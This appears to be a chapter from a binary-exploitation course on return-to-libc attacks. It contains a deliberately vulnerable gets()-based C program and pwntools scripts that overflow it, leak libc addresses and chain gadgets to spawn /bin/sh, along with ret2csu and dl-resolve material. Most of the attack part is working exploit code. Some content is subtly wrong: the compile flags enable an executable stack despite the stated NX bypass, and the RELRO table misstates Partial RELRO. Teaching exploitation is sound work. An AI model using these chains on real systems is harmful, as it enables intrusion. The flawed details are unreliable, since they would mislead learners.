# Return-to-libc Techniques

Return-to-libc is a code reuse attack that executes existing library functions instead of injecting new shellcode. This technique bypasses non-executable stack protections (NX/DEP) by leveraging legitimate code already present in memory.

## Understanding Return-to-libc

### Why Return-to-libc?

With NX/DEP enabled, traditional shellcode injection fails because the stack is non-executable. Return-to-libc solves this by:

1. **Reusing existing code** - Call functions already in memory
2. **Bypassing NX protection** - Execute legitimate library code
3. **Achieving similar goals** - Spawn shells, execute commands
4. **Working with ASLR** - Can be combined with information leaks

### Basic Concept

```
Traditional Shellcode vs Return-to-libc:

Shellcode Injection (Blocked by NX):
┌─────────────────────┐
│ Buffer Overflow     │ → Overwrite return address
├─────────────────────┤
│ Return to Stack     │ → Points to injected shellcode
├─────────────────────┤
│ Shellcode on Stack  │ → BLOCKED: Stack not executable
└─────────────────────┘

Return-to-libc (Bypasses NX):
┌─────────────────────┐
│ Buffer Overflow     │ → Overwrite return address
├─────────────────────┤
│ Return to libc      │ → Points to system() function
├─────────────────────┤
│ Function Arguments  │ → "/bin/sh" string
└─────────────────────┘
```

## Basic Return-to-libc Attack

### Simple system() Call

```c
// vuln_ret2libc.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void vulnerable_function() {
    char buffer[64];
    
    printf("Enter input: ");
    gets(buffer);  // Vulnerable to buffer overflow
    
    printf("You entered: %s\n", buffer);
}

int main() {
    printf("System function at: %p\n", system);
    printf("Exit function at: %p\n", exit);
    
    vulnerable_function();
    
    return 0;
}
```

**Compilation:**
```bash
# Disable modern protections for learning
gcc -fno-stack-protector -no-pie -z execstack -o vuln_ret2libc vuln_ret2libc.c

# Check protections
checksec vuln_ret2libc
```

### Basic Exploitation

```python
#!/usr/bin/env python3
from pwn import *

def basic_ret2libc():
    """Basic return-to-libc attack calling system()"""
    
    context.arch = 'amd64'
    
    # Start the process
    p = process('./vuln_ret2libc')
    
    # Receive the function addresses printed by the program
    output = p.recvuntil(b'Enter input: ')
    print(output.decode())
    
    # Parse addresses (in real attack, these would be leaked)
    # For now, we'll use static analysis
    
    elf = ELF('./vuln_ret2libc')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Adjust path
    
    # Find system address (if linked statically or known offset)
    system_addr = elf.plt['system']  # PLT entry
    
    # Find "/bin/sh" string in libc
    # We need to either have it in the binary or calculate from libc base
    binsh_str = next(elf.search(b'/bin/sh\x00'))  # If present in binary
    
    print(f"system() PLT: 0x{system_addr:x}")
    print(f"/bin/sh string: 0x{binsh_str:x}")
    
    # Build ROP chain
    # For x86_64: system(arg1) where arg1 is in RDI
    
    # Find gadget to set RDI
    rop = ROP(elf)
    rop.system(binsh_str)
    
    # Build payload
    offset = 72  # Distance to return address
    payload = b'A' * offset
    payload += rop.chain()
    
    # Send payload
    p.sendline(payload)
    
    # Interact with shell
    p.interactive()

def manual_ret2libc():
    """Manual return-to-libc without pwntools automation"""
    
    # Find addresses manually
    elf = ELF('./vuln_ret2libc')
    
    # System function address (from PLT)
    system_plt = elf.plt['system']
    
    # Need to find "/bin/sh" string
    # Method 1: If it exists in the binary
    try:
        binsh_addr = next(elf.search(b'/bin/sh\x00'))
        print(f"Found /bin/sh in binary: 0x{binsh_addr:x}")
    except:
        # Method 2: Use environment variables
        # "/bin/sh" might be in environment
        binsh_addr = 0x7fffffffe000  # Example environment address
        print(f"Using environment /bin/sh: 0x{binsh_addr:x}")
    
    # For x86_64, need ROP gadget to set RDI
    # Find "pop rdi; ret" gadget
    pop_rdi_ret = None
    
    # Search for pop rdi gadget
    for addr in elf.search(asm('pop rdi; ret')):
        pop_rdi_ret = addr
        break
    
    if not pop_rdi_ret:
        print("No pop rdi gadget found, trying alternatives...")
        # Look for other ways to set RDI
        return
    
    print(f"pop rdi; ret gadget: 0x{pop_rdi_ret:x}")
    
    # Build exploit
    p = process('./vuln_ret2libc')
    p.recvuntil(b'Enter input: ')
    
    offset = 72
    payload = b'A' * offset
    
    # ROP chain: pop rdi; ret -> "/bin/sh" -> system
    payload += p64(pop_rdi_ret)    # pop rdi; ret
    payload += p64(binsh_addr)     # "/bin/sh" argument
    payload += p64(system_plt)     # system() function
    
    p.sendline(payload)
    p.interactive()

basic_ret2libc()
```

## Advanced Return-to-libc Techniques

### ret2plt - Using PLT Entries

```python
#!/usr/bin/env python3
from pwn import *

def ret2plt_attack():
    """Use PLT entries to call library functions"""
    
    context.arch = 'amd64'
    elf = ELF('./vuln_ret2libc')
    
    # PLT entries are stub functions that resolve to actual library functions
    plt_entries = {
        'system': elf.plt.get('system'),
        'printf': elf.plt.get('printf'),
        'puts': elf.plt.get('puts'),
        'exit': elf.plt.get('exit'),
    }
    
    print("Available PLT entries:")
    for func, addr in plt_entries.items():
        if addr:
            print(f"  {func}: 0x{addr:x}")
    
    # Strategy: Use printf to leak addresses, then call system
    def leak_and_exploit():
        """Two-stage attack: leak then exploit"""
        
        # Stage 1: Leak libc addresses using printf
        p = process('./vuln_ret2libc')
        p.recvuntil(b'Enter input: ')
        
        # Find GOT entry to leak
        printf_got = elf.got['printf']
        printf_plt = elf.plt['printf']
        
        # Find format string for printf
        format_str = next(elf.search(b'%p\x00'))  # Look for "%p" format
        
        # ROP chain to call printf(format, got_entry)
        pop_rdi = 0x401234  # Example pop rdi gadget
        pop_rsi = 0x401567  # Example pop rsi gadget
        main_addr = elf.symbols['main']  # Return to main for second exploit
        
        payload = b'A' * 72
        payload += p64(pop_rdi)
        payload += p64(format_str)
        payload += p64(pop_rsi)
        payload += p64(printf_got)
        payload += p64(printf_plt)
        payload += p64(main_addr)  # Return to main
        
        p.sendline(payload)
        
        # Receive leaked address
        leak = p.recvline()
        leaked_printf = int(leak.strip(), 16)
        
        print(f"Leaked printf address: 0x{leaked_printf:x}")
        
        # Calculate libc base
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        libc_base = leaked_printf - libc.symbols['printf']
        system_addr = libc_base + libc.symbols['system']
        binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
        
        print(f"Calculated system: 0x{system_addr:x}")
        print(f"Calculated /bin/sh: 0x{binsh_addr:x}")
        
        # Stage 2: Call system with known addresses
        p.recvuntil(b'Enter input: ')
        
        payload2 = b'A' * 72
        payload2 += p64(pop_rdi)
        payload2 += p64(binsh_addr)
        payload2 += p64(system_addr)
        
        p.sendline(payload2)
        p.interactive()
    
    leak_and_exploit()

def ret2got_attack():
    """Attack using GOT overwrites"""
    
    elf = ELF('./vuln_ret2libc')
    
    # Global Offset Table contains actual addresses of library functions
    got_entries = {
        'system': elf.got.get('system'),
        'printf': elf.got.get('printf'),
        'puts': elf.got.get('puts'),
    }
    
    print("GOT entries:")
    for func, addr in got_entries.items():
        if addr:
            print(f"  {func}: 0x{addr:x}")
    
    # Strategy: Overwrite GOT entry to redirect function calls
    def got_overwrite_strategy():
        """Overwrite GOT to redirect function calls"""
        
        print("GOT overwrite strategy:")
        print("1. Use format string vulnerability to write to GOT")
        print("2. Overwrite printf@got with system address")
        print("3. Call printf with '/bin/sh' argument")
        print("4. Actually executes system('/bin/sh')")
        
        # This requires a format string vulnerability for writing
        # Combined with buffer overflow for control
    
    got_overwrite_strategy()

ret2plt_attack()
```

### ret2libc with Chained Calls

```python
#!/usr/bin/env python3
from pwn import *

def chained_ret2libc():
    """Chain multiple library function calls"""
    
    context.arch = 'amd64'
    elf = ELF('./vuln_ret2libc')
    
    def multiple_function_calls():
        """Call multiple functions in sequence"""
        
        # Example: printf("Hello") -> system("/bin/sh")
        
        pop_rdi = 0x401234  # pop rdi; ret gadget
        printf_plt = elf.plt['printf']
        system_plt = elf.plt['system']
        
        # Find strings
        hello_str = next(elf.search(b'Hello\x00'))
        binsh_str = next(elf.search(b'/bin/sh\x00'))
        
        payload = b'A' * 72
        
        # First call: printf("Hello")
        payload += p64(pop_rdi)
        payload += p64(hello_str)
        payload += p64(printf_plt)
        
        # Second call: system("/bin/sh")
        payload += p64(pop_rdi)
        payload += p64(binsh_str)
        payload += p64(system_plt)
        
        return payload
    
    def function_with_multiple_args():
        """Call function with multiple arguments"""
        
        # Example: execve("/bin/sh", argv, envp)
        
        # x86_64 calling convention: RDI, RSI, RDX, RCX, R8, R9
        pop_rdi = 0x401234  # pop rdi; ret
        pop_rsi = 0x401567  # pop rsi; ret  
        pop_rdx = 0x401890  # pop rdx; ret
        
        execve_addr = 0x7ffff7a52390  # Example execve address
        binsh_addr = 0x7ffff7b97e9a   # "/bin/sh" string
        null_ptr = 0x404800           # NULL pointer
        
        payload = b'A' * 72
        
        # Set up arguments: execve("/bin/sh", NULL, NULL)
        payload += p64(pop_rdi)       # First argument
        payload += p64(binsh_addr)
        payload += p64(pop_rsi)       # Second argument
        payload += p64(null_ptr)
        payload += p64(pop_rdx)       # Third argument
        payload += p64(null_ptr)
        payload += p64(execve_addr)   # Call execve
        
        return payload
    
    print("Chained function call examples:")
    print("1. Multiple single-argument functions")
    print("2. Single function with multiple arguments")

def ret2libc_with_stack_setup():
    """ret2libc with proper stack frame setup"""
    
    def setup_fake_stack_frame():
        """Set up fake stack frame for function call"""
        
        # Some functions expect proper stack frame setup
        # Especially when calling complex library functions
        
        fake_frame_c = '''
        // Function expecting stack frame
        void complex_function(char *cmd) {
            char local_buffer[100];
            sprintf(local_buffer, "Executing: %s", cmd);
            system(cmd);
        }
        '''
        
        print("Stack frame setup for complex functions:")
        print("1. Set up fake saved RBP")
        print("2. Ensure stack alignment (16-byte boundary)")
        print("3. Account for local variables")
        print("4. Proper argument passing")
        
        # Stack alignment is crucial for x86_64
        # Stack must be 16-byte aligned before call instruction
        
        ret_gadget = 0x401000     # Simple ret gadget for alignment
        pop_rdi = 0x401234        # pop rdi; ret
        system_addr = 0x7ffff7a52390
        binsh_addr = 0x7ffff7b97e9a
        
        payload = b'A' * 72
        
        # Ensure 16-byte stack alignment
        payload += p64(ret_gadget)    # Extra ret for alignment
        payload += p64(pop_rdi)
        payload += p64(binsh_addr)
        payload += p64(system_addr)
        
        return payload
    
    setup_fake_stack_frame()

chained_ret2libc()
```

## ASLR Bypass Techniques

### Information Disclosure for ASLR Bypass

```python
#!/usr/bin/env python3
from pwn import *

def aslr_bypass_ret2libc():
    """Bypass ASLR for return-to-libc attacks"""
    
    def leak_libc_base():
        """Leak libc base address to calculate function addresses"""
        
        # Method 1: Use puts to leak GOT entries
        def puts_leak_method():
            """Use puts() to leak libc addresses"""
            
            elf = ELF('./vuln_ret2libc')
            
            # puts() prints string at address
            # We can use it to print GOT entries (which contain libc addresses)
            
            puts_plt = elf.plt['puts']
            puts_got = elf.got['puts']
            main_addr = elf.symbols['main']
            pop_rdi = 0x401234  # pop rdi; ret gadget
            
            print("puts() leak strategy:")
            print("1. Call puts(puts@got) to leak puts address")
            print("2. Calculate libc base from leaked address")
            print("3. Return to main for second exploitation")
            
            # Stage 1 payload: leak libc address
            payload1 = b'A' * 72
            payload1 += p64(pop_rdi)
            payload1 += p64(puts_got)     # Address to print
            payload1 += p64(puts_plt)     # Call puts
            payload1 += p64(main_addr)    # Return to main
            
            return payload1
        
        def printf_leak_method():
            """Use printf() to leak addresses"""
            
            elf = ELF('./vuln_ret2libc')
            
            printf_plt = elf.plt['printf']
            printf_got = elf.got['printf']
            
            # Need format string
            format_str = next(elf.search(b'%p\x00'))  # Find "%p" format
            
            pop_rdi = 0x401234    # pop rdi; ret
            pop_rsi = 0x401567    # pop rsi; ret
            main_addr = elf.symbols['main']
            
            print("printf() leak strategy:")
            print("1. Call printf('%p', target_got) to leak address")
            print("2. Parse printed hex value")
            print("3. Calculate libc base")
            
            # Stage 1 payload: leak using printf
            payload1 = b'A' * 72
            payload1 += p64(pop_rdi)
            payload1 += p64(format_str)   # "%p" format string
            payload1 += p64(pop_rsi)
            payload1 += p64(printf_got)   # Address to leak
            payload1 += p64(printf_plt)   # Call printf
            payload1 += p64(main_addr)    # Return to main
            
            return payload1
        
        puts_leak_method()
        printf_leak_method()
    
    def complete_aslr_bypass():
        """Complete ASLR bypass + ret2libc exploit"""
        
        context.arch = 'amd64'
        
        # This example assumes we have format string + buffer overflow
        p = process('./vuln_ret2libc')
        
        # Stage 1: Leak libc address
        elf = ELF('./vuln_ret2libc')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        
        puts_plt = elf.plt['puts']
        puts_got = elf.got['puts']
        main_addr = elf.symbols['main']
        pop_rdi_ret = 0x401234  # Found using ROPgadget
        
        p.recvuntil(b'Enter input: ')
        
        # Leak payload
        leak_payload = b'A' * 72
        leak_payload += p64(pop_rdi_ret)
        leak_payload += p64(puts_got)
        leak_payload += p64(puts_plt)
        leak_payload += p64(main_addr)
        
        p.sendline(leak_payload)
        
        # Receive leaked address
        leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
        print(f"Leaked puts: 0x{leaked_puts:x}")
        
        # Calculate libc base
        libc_base = leaked_puts - libc.symbols['puts']
        system_addr = libc_base + libc.symbols['system']
        binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
        
        print(f"Libc base: 0x{libc_base:x}")
        print(f"System: 0x{system_addr:x}")
        print(f"/bin/sh: 0x{binsh_addr:x}")
        
        # Stage 2: Exploit with known addresses
        p.recvuntil(b'Enter input: ')
        
        exploit_payload = b'A' * 72
        exploit_payload += p64(pop_rdi_ret)
        exploit_payload += p64(binsh_addr)
        exploit_payload += p64(system_addr)
        
        p.sendline(exploit_payload)
        p.interactive()
    
    leak_libc_base()

aslr_bypass_ret2libc()
```

### ret2dl-resolve

```python
#!/usr/bin/env python3
from pwn import *

def ret2dl_resolve():
    """Advanced ret2libc using dynamic linker resolution"""
    
    def dl_resolve_concept():
        """Understand dynamic linker resolution process"""
        
        dl_resolve_explanation = '''
        Dynamic Linker Resolution Process:
        
        1. First call to library function goes through PLT
        2. PLT jumps to GOT entry (initially points to PLT)
        3. PLT calls _dl_runtime_resolve()
        4. _dl_runtime_resolve() resolves actual function address
        5. GOT entry updated with real address
        6. Future calls go directly to function
        
        Exploitation:
        - Control _dl_runtime_resolve() parameters
        - Force resolution of any function
        - Bypass ASLR by controlling resolution process
        '''
        
        print(dl_resolve_explanation)
    
    def forge_relocation_table():
        """Forge relocation table entries"""
        
        # This is an advanced technique that requires:
        # 1. Understanding ELF structure
        # 2. Control over multiple memory regions
        # 3. Ability to forge relocation entries
        
        forge_example = '''
        Steps to forge relocation:
        1. Create fake Elf64_Rela structure
        2. Create fake Elf64_Sym structure  
        3. Create fake string table entry
        4. Point relocation to our structures
        5. Call _dl_runtime_resolve with crafted index
        '''
        
        print("Relocation table forging:")
        print(forge_example)
        
        # Example structures (simplified)
        fake_rela = {
            'r_offset': 0x404000,    # Where to write resolved address
            'r_info': 0x100000007,   # Symbol index + relocation type
            'r_addend': 0            # Addend for calculation
        }
        
        fake_sym = {
            'st_name': 0x1000,       # Offset to symbol name in string table
            'st_info': 0x12,         # Symbol type and binding
            'st_other': 0,           # Symbol visibility
            'st_shndx': 0,           # Section index
            'st_value': 0,           # Symbol value
            'st_size': 0             # Symbol size
        }
        
        print("Fake structures created for resolution")
    
    dl_resolve_concept()
    forge_relocation_table()

def ret2csu():
    """ret2csu technique using __libc_csu_init gadgets"""
    
    def csu_gadgets():
        """Universal gadgets in __libc_csu_init"""
        
        # Most binaries have __libc_csu_init function
        # This function contains useful gadgets for calling functions
        
        csu_explanation = '''
        __libc_csu_init contains universal gadgets:
        
        pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
        mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
        
        This allows calling any function with controlled arguments:
        - r13 (RDI): First argument
        - r14 (RSI): Second argument  
        - r15 (RDX): Third argument
        - r12+rbx*8: Function to call
        '''
        
        print(csu_explanation)
    
    def csu_exploit_example():
        """Example exploit using CSU gadgets"""
        
        elf = ELF('./vuln_ret2libc')
        
        # Find CSU gadgets
        csu_pop_gadget = None
        csu_call_gadget = None
        
        # These are typically at predictable offsets in __libc_csu_init
        csu_init = elf.symbols.get('__libc_csu_init')
        if csu_init:
            csu_pop_gadget = csu_init + 0x5a   # Typical offset
            csu_call_gadget = csu_init + 0x40  # Typical offset
        
        print(f"CSU pop gadget: 0x{csu_pop_gadget:x}")
        print(f"CSU call gadget: 0x{csu_call_gadget:x}")
        
        # Example: Call write(1, buffer, size) using CSU gadgets
        def csu_write_call():
            """Use CSU to call write()"""
            
            write_got = elf.got['write']  # Function to call
            buffer_addr = 0x404000        # Buffer to write
            size = 8                      # Size to write
            
            payload = b'A' * 72
            
            # First gadget: pop registers
            payload += p64(csu_pop_gadget)
            payload += p64(0)             # RBX
            payload += p64(1)             # RBP
            payload += p64(write_got)     # R12 (function pointer)
            payload += p64(1)             # R13 (RDI - fd)
            payload += p64(buffer_addr)   # R14 (RSI - buffer)
            payload += p64(size)          # R15 (RDX - size)
            
            # Second gadget: call function
            payload += p64(csu_call_gadget)
            
            # Stack adjustment after call
            payload += p64(0) * 7         # Dummy values for stack cleanup
            
            return payload
        
        csu_write_call()
    
    csu_gadgets()
    csu_exploit_example()

ret2dl_resolve()
```

## Defensive Measures and Bypasses

### RELRO and ret2libc

```python
#!/usr/bin/env python3

def relro_impact_on_ret2libc():
    """How RELRO affects return-to-libc attacks"""
    
    relro_levels = {
        'No RELRO': {
            'got_writable': True,
            'plt_writable': True,
            'impact': 'GOT overwrite attacks possible',
            'ret2libc_effect': 'Minimal - all techniques work'
        },
        'Partial RELRO': {
            'got_writable': False,
            'plt_writable': True,
            'impact': 'GOT entries read-only after initialization',
            'ret2libc_effect': 'GOT overwrite prevented, PLT calls still work'
        },
        'Full RELRO': {
            'got_writable': False,
            'plt_writable': False,
            'impact': 'All relocations resolved at load time',
            'ret2libc_effect': 'Must use direct function addresses'
        }
    }
    
    print("RELRO Impact on ret2libc:")
    for level, details in relro_levels.items():
        print(f"\n{level}:")
        for key, value in details.items():
            print(f"  {key}: {value}")

def fortify_source_bypass():
    """Bypass FORTIFY_SOURCE with ret2libc"""
    
    fortify_explanation = '''
    FORTIFY_SOURCE adds bounds checking to dangerous functions:
    - strcpy() -> __strcpy_chk()
    - sprintf() -> __sprintf_chk()
    - memcpy() -> __memcpy_chk()
    
    ret2libc bypass strategies:
    1. Call original functions directly (not checked versions)
    2. Use functions not covered by FORTIFY_SOURCE
    3. Call mprotect() to make stack executable, then use shellcode
    4. Use execve() family functions directly
    '''
    
    print("FORTIFY_SOURCE bypass with ret2libc:")
    print(fortify_explanation)
    
    def mprotect_shellcode_combo():
        """Use mprotect + ret2libc to enable shellcode execution"""
        
        # Strategy: Use ret2libc to call mprotect() and make stack executable
        
        mprotect_payload = '''
        ROP Chain:
        1. pop rdi; ret          -> Stack address (page-aligned)
        2. pop rsi; ret          -> Page size
        3. pop rdx; ret          -> PROT_READ | PROT_WRITE | PROT_EXEC
        4. mprotect address      -> Make stack executable
        5. shellcode address     -> Jump to shellcode on now-executable stack
        '''
        
        print("mprotect + shellcode strategy:")
        print(mprotect_payload)

relro_impact_on_ret2libc()
```

## Complete ret2libc Framework

```python
#!/usr/bin/env python3
from pwn import *

class Ret2libcFramework:
    def __init__(self, binary_path, libc_path=None):
        self.binary_path = binary_path
        self.elf = ELF(binary_path)
        self.libc = ELF(libc_path) if libc_path else None
        self.gadgets = {}
        self.leaked_addresses = {}
        
    def find_gadgets(self):
        """Find useful ROP gadgets"""
        
        rop = ROP(self.elf)
        
        # Essential gadgets for x86_64
        essential_gadgets = [
            'pop rdi; ret',
            'pop rsi; ret', 
            'pop rdx; ret',
            'pop rax; ret',
            'ret'
        ]
        
        print("Searching for gadgets...")
        
        for gadget_desc in essential_gadgets:
            try:
                if 'pop rdi' in gadget_desc:
                    self.gadgets['pop_rdi'] = rop.find_gadget(['pop rdi', 'ret'])[0]
                elif 'pop rsi' in gadget_desc:
                    self.gadgets['pop_rsi'] = rop.find_gadget(['pop rsi', 'ret'])[0]
                elif 'pop rdx' in gadget_desc:
                    self.gadgets['pop_rdx'] = rop.find_gadget(['pop rdx', 'ret'])[0]
                elif 'ret' == gadget_desc:
                    self.gadgets['ret'] = rop.find_gadget(['ret'])[0]
                    
                print(f"Found {gadget_desc}: 0x{self.gadgets.get(gadget_desc.split()[1], 0):x}")
                
            except:
                print(f"Could not find: {gadget_desc}")
    
    def analyze_functions(self):
        """Analyze available functions"""
        
        plt_functions = []
        got_functions = []
        
        for func in ['system', 'execve', 'printf', 'puts', 'write', 'read']:
            if func in self.elf.plt:
                plt_functions.append((func, self.elf.plt[func]))
            if func in self.elf.got:
                got_functions.append((func, self.elf.got[func]))
        
        print("Available PLT functions:")
        for func, addr in plt_functions:
            print(f"  {func}: 0x{addr:x}")
        
        print("Available GOT entries:")
        for func, addr in got_functions:
            print(f"  {func}: 0x{addr:x}")
        
        return plt_functions, got_functions
    
    def find_strings(self):
        """Find useful strings in binary"""
        
        useful_strings = [b'/bin/sh', b'/bin/bash', b'sh', b'cat', b'flag']
        found_strings = {}
        
        for string in useful_strings:
            try:
                addr = next(self.elf.search(string + b'\x00'))
                found_strings[string.decode()] = addr
                print(f"Found string '{string.decode()}': 0x{addr:x}")
            except:
                continue
        
        return found_strings
    
    def leak_libc_address(self, target_binary):
        """Attempt to leak libc addresses"""
        
        if 'puts' not in self.elf.plt:
            print("No puts() available for leaking")
            return None
        
        puts_plt = self.elf.plt['puts']
        puts_got = self.elf.got['puts']
        main_addr = self.elf.symbols.get('main')
        
        if not all([puts_plt, puts_got, main_addr, self.gadgets.get('pop_rdi')]):
            print("Missing requirements for libc leak")
            return None
        
        print("Attempting libc leak...")
        
        p = process(target_binary)
        
        # Build leak payload
        payload = b'A' * 72  # Adjust offset
        payload += p64(self.gadgets['pop_rdi'])
        payload += p64(puts_got)
        payload += p64(puts_plt)
        payload += p64(main_addr)
        
        p.sendline(payload)
        
        try:
            leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
            print(f"Leaked puts address: 0x{leaked:x}")
            
            if self.libc:
                libc_base = leaked - self.libc.symbols['puts']
                print(f"Calculated libc base: 0x{libc_base:x}")
                
                self.leaked_addresses['libc_base'] = libc_base
                self.leaked_addresses['system'] = libc_base + self.libc.symbols['system']
                self.leaked_addresses['binsh'] = libc_base + next(self.libc.search(b'/bin/sh\x00'))
                
                return libc_base
            
        except Exception as e:
            print(f"Leak failed: {e}")
            
        finally:
            p.close()
        
        return None
    
    def generate_exploit(self, target='system'):
        """Generate complete exploit"""
        
        if target == 'system':
            if 'system' in self.leaked_addresses and 'binsh' in self.leaked_addresses:
                # Use leaked addresses
                system_addr = self.leaked_addresses['system']
                binsh_addr = self.leaked_addresses['binsh']
            elif 'system' in self.elf.plt:
                # Use PLT entry
                system_addr = self.elf.plt['system']
                strings = self.find_strings()
                binsh_addr = strings.get('/bin/sh')
            else:
                print("Cannot find system() or /bin/sh")
                return None
            
            if not all([system_addr, binsh_addr, self.gadgets.get('pop_rdi')]):
                print("Missing requirements for system() call")
                return None
            
            # Build exploit payload
            payload = b'A' * 72  # Buffer overflow
            payload += p64(self.gadgets['pop_rdi'])
            payload += p64(binsh_addr)
            payload += p64(system_addr)
            
            print(f"Generated exploit calling system(0x{binsh_addr:x})")
            return payload
        
        return None
    
    def exploit(self):
        """Run complete exploitation process"""
        
        print(f"Analyzing binary: {self.binary_path}")
        
        # Step 1: Find gadgets
        self.find_gadgets()
        
        # Step 2: Analyze functions
        self.analyze_functions()
        
        # Step 3: Find strings
        self.find_strings()
        
        # Step 4: Attempt libc leak (if needed)
        if self.libc:
            self.leak_libc_address(self.binary_path)
        
        # Step 5: Generate and test exploit
        payload = self.generate_exploit()
        
        if payload:
            print("Testing exploit...")
            p = process(self.binary_path)
            p.sendline(payload)
            p.interactive()

# Usage example
def demonstrate_ret2libc_framework():
    """Demonstrate the ret2libc framework"""
    
    framework = Ret2libcFramework('./vuln_ret2libc', '/lib/x86_64-linux-gnu/libc.so.6')
    framework.exploit()

# demonstrate_ret2libc_framework()
```

## Key Takeaways

!!! important "ret2libc Fundamentals"
    - **Bypasses NX/DEP protection** - Executes existing code instead of injected shellcode
    - **Requires ROP gadgets** - Need gadgets to set up function arguments
    - **ASLR complicates attacks** - Must leak addresses or use information disclosure
    - **PLT entries are reliable targets** - Less affected by ASLR than direct library addresses
    - **Multiple techniques available** - From simple system() calls to complex dl-resolve

!!! warning "Common Challenges"
    - Stack alignment requirements on x86_64
    - Finding suitable ROP gadgets for argument setup
    - RELRO protection limiting GOT overwrites
    - FORTIFY_SOURCE changing function behavior
    - Limited gadgets in smaller binaries

!!! tip "Attack Strategies"
    - Start with information leaks to defeat ASLR
    - Use puts() or printf() to leak libc addresses
    - Chain multiple function calls for complex operations
    - Consider CSU gadgets for universal argument setup
    - Combine with other vulnerabilities for complete exploitation

---

*Next: [ROP Techniques](../advanced/01-rop.md)*
